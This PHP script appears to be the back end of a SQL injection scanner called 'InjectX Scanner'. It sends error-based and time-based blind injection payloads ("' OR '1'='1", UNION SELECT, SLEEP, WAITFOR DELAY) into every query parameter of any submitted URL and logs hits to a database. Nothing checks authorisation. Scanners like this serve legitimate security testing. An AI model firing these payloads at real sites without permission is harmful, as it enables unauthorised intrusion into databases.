<?php

ob_start();

set_time_limit(120);

require_once 'db.php';


/* =========================================
   CHECK REQUEST
========================================= */

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['target_url'])) {
    die('Error: Target URL was not received.');
}


$target_url = trim($_POST['target_url']);

$scan_type = $_POST['scan_type'] ?? 'full';


/* =========================================
   PARSE URL
========================================= */

$parsed_url = parse_url($target_url);

if (!isset($parsed_url['query'])) {
    die('Error: Target URL must contain query parameters (example: ?id=1).');
}


parse_str($parsed_url['query'], $params);


/* =========================================
   BUILD BASE URL
========================================= */

$base_url =
    ($parsed_url['scheme'] ?? 'http') .
    '://' .
    ($parsed_url['host'] ?? '') .
    ($parsed_url['path'] ?? '');


if (isset($parsed_url['port'])) {
    $base_url =
        ($parsed_url['scheme'] ?? 'http') .
        '://' .
        ($parsed_url['host'] ?? '') .
        ':' .
        $parsed_url['port'] .
        ($parsed_url['path'] ?? '');
}


/* =========================================
   CREATE SCAN RECORD
========================================= */

$stmt = $con->prepare(
    'INSERT INTO scans (target_url, status, total_vuln)
     VALUES (?, "Running", 0)'
);

$stmt->execute([$target_url]);

$scan_id = $con->lastInsertId();


/* =========================================
   PAYLOAD CONFIGURATION
========================================= */

$error_payload = [
    "'",
    "''",
    "' OR '1'='1",
    "' UNION SELECT NULL--"
];


$time_payload = [
    "' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--"
];


/* =========================================
   DATABASE ERROR PATTERNS
========================================= */

$db_error = [

    'you have an error in your sql syntax',
    'warning: mysql',
    'mysql_fetch_array()',
    'mysql_num_rows()',
    'mysqli_sql_exception',
    'unclosed quotation mark',
    'quoted string not properly terminated',
    'pg_exec()',
    'postgresql',
    'sqlite3::query',
    'sqlite error',
    'ora-00933',
    'ora-01756',
    'sql syntax',
    'sqlstate[',
    'pdoexception'

];


/* =========================================
   CURL REQUEST FUNCTION
========================================= */

function send_request($url)
{
    $c = curl_init();

    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);

    curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($c, CURLOPT_TIMEOUT, 8);

    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);

    curl_setopt(
        $c,
        CURLOPT_USERAGENT,
        'InjectX Scanner/1.0'
    );

    $start = microtime(true);

    $response = curl_exec($c);

    $duration = microtime(true) - $start;

    $curl_error = curl_error($c);

    curl_close($c);

    return [
        'body' => $response ?: '',
        'time' => $duration,
        'error' => $curl_error
    ];
}


/* =========================================
   VULNERABILITY COUNTER
========================================= */

$vuln_found = 0;


/* =========================================
   SCAN EACH PARAMETER
========================================= */

foreach ($params as $param_name => $original_value) {


    /* =====================================
       BASELINE REQUEST
       Used for time-based comparison
    ===================================== */

    $baseline_params = $params;

    $baseline_query = http_build_query($baseline_params);

    $baseline_url = $base_url . '?' . $baseline_query;

    $baseline = send_request($baseline_url);

    $baseline_time = $baseline['time'];


    /* =====================================
       1. ERROR-BASED SQL INJECTION
    ===================================== */

    foreach ($error_payload as $payload) {

        $test_params = $params;

        $test_params[$param_name] =
            $original_value . $payload;

        $test_query = http_build_query($test_params);

        $test_url = $base_url . '?' . $test_query;


        $res = send_request($test_url);


        /* Ignore failed requests */

        if ($res['error'] !== '') {
            continue;
        }


        /* Check response for database errors */

        foreach ($db_error as $error) {

            if (
                $res['body'] &&
                stripos($res['body'], $error) !== false
            ) {

                $vuln_stmt = $con->prepare(
                    'INSERT INTO vuln
                    (scan_id, para_name, sqli_type, payload, details)
                    VALUES (?, ?, "Error-Based", ?, ?)'
                );


                $details =
                    'Triggered database error keyword: "' .
                    $error .
                    '"';


                $vuln_stmt->execute([
                    $scan_id,
                    $param_name,
                    $payload,
                    $details
                ]);


                $vuln_found++;


                /*
                 * This parameter has already been
                 * confirmed vulnerable.
                 *
                 * Move to next parameter.
                 */

                break 2;
            }
        }
    }


    /* =====================================
       2. TIME-BASED BLIND SQL INJECTION
    ===================================== */

    if ($scan_type === 'full') {

        foreach ($time_payload as $payload) {

            $test_params = $params;

            $test_params[$param_name] =
                $original_value . $payload;


            $test_query = http_build_query($test_params);

            $test_url = $base_url . '?' . $test_query;


            $res = send_request($test_url);


            /*
             * Ignore requests that failed.
             */

            if ($res['error'] !== '') {
                continue;
            }


            $response_time = $res['time'];


            /*
             * Calculate additional delay
             * compared with normal request.
             */

            $delay =
                $response_time - $baseline_time;


            /*
             * Require BOTH:
             *
             * 1. Request took at least 2.5 sec
             * 2. It was at least 2 sec slower
             *    than the normal request.
             *
             * This reduces false positives caused
             * by normal network/server delays.
             */

            if (
                $response_time >= 2.5 &&
                $delay >= 2.0
            ) {

                $vuln_stmt = $con->prepare(
                    'INSERT INTO vuln
                    (scan_id, para_name, sqli_type, payload, details)
                    VALUES (?, ?, "Time-Based Blind", ?, ?)'
                );


                $details =
                    'Server response delayed by ' .
                    round($response_time, 2) .
                    ' seconds. ' .
                    'Baseline response was ' .
                    round($baseline_time, 2) .
                    ' seconds.';


                $vuln_stmt->execute([
                    $scan_id,
                    $param_name,
                    $payload,
                    $details
                ]);


                $vuln_found++;

                break;
            }
        }
    }
}


/* =========================================
   UPDATE SCAN RESULT
========================================= */

$update_stmt = $con->prepare(
    'UPDATE scans
     SET status = "Completed",
         total_vuln = ?
     WHERE id = ?'
);


$update_stmt->execute([
    $vuln_found,
    $scan_id
]);


/* =========================================
   REDIRECT TO RESULT
========================================= */

ob_end_clean();

header(
    'Location: result.php?scan_id=' .
    urlencode($scan_id)
);

exit();

?>
